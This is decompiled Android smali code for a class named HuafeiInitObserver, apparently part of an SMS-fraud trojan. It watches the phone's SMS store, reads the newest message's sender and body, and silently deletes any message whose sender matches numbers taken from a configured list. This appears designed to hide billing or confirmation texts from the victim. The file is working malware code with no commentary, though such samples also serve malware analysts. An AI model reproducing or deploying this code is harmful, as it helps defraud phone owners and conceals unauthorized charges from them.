.class public Lorg/hj201606/lib/sms/HuafeiInitObserver;
.super Landroid/database/ContentObserver;


# instance fields
.field private a:Landroid/content/Context;

.field private b:Ljava/lang/String;

.field private c:Ljava/lang/String;

.field private d:Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/os/Handler;Landroid/content/Context;)V
    .locals 1

    invoke-direct {p0, p1}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    const/4 v0, 0x0

    iput-object v0, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->d:Ljava/lang/String;

    iput-object p2, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->a:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public onChange(Z)V
    .locals 12

    const-wide/16 v8, -0x1

    const/4 v6, 0x0

    const/4 v2, 0x0

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "HuafeiInitObserver_________________start"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    iput-object v2, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->b:Ljava/lang/String;

    iput-object v2, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->c:Ljava/lang/String;

    :try_start_0
    iget-object v0, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "_id"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "address"

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-string v4, "body"

    aput-object v4, v2, v3

    const/4 v3, 0x0

    const/4 v4, 0x0

    const-string v5, "_id desc"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v2

    if-lez v2, :cond_4

    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v2

    if-eqz v2, :cond_4

    const/4 v2, 0x0

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v2

    const/4 v4, 0x1

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->b:Ljava/lang/String;

    const/4 v4, 0x2

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->c:Ljava/lang/String;

    move-wide v4, v2

    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    move v2, v6

    :goto_1
    sget v1, Lorg/hj201606/lib/HejuInstance;->sentNum:I

    if-lt v2, v1, :cond_0

    :goto_2
    return-void

    :cond_0
    sget-object v1, Lorg/hj201606/lib/HejuInstance;->sentParamsStr:Ljava/lang/String;

    const-string v3, "\\|\\|"

    invoke-virtual {v1, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    aget-object v1, v1, v2

    const-string v3, "divis"

    invoke-virtual {v1, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    const/4 v3, 0x7

    aget-object v1, v1, v3

    iput-object v1, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->d:Ljava/lang/String;

    iget-object v1, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->d:Ljava/lang/String;

    const-string v3, ""

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    iget-object v1, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->d:Ljava/lang/String;

    const-string v3, "0"

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    iget-object v1, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->d:Ljava/lang/String;

    const-string v3, ","

    invoke-virtual {v1, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    move v1, v6

    :goto_3
    array-length v7, v3

    if-lt v1, v7, :cond_2

    :cond_1
    add-int/lit8 v1, v2, 0x1

    move v2, v1

    goto :goto_1

    :cond_2
    cmp-long v7, v4, v8

    if-eqz v7, :cond_3

    iget-object v7, p0, Lorg/hj201606/lib/sms/HuafeiInitObserver;->b:Ljava/lang/String;

    aget-object v10, v3, v1

    invoke-virtual {v7, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_3

    sget-object v7, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "Observer delete_________________"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v11, v3, v1

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v7, v10}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    const-string v7, "content://sms"

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "_id="

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    const/4 v11, 0x0

    invoke-virtual {v0, v7, v10, v11}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_3
    add-int/lit8 v1, v1, 0x1

    goto :goto_3

    :cond_4
    move-wide v4, v8

    goto/16 :goto_0

    :catch_0
    move-exception v0

    goto :goto_2
.end method
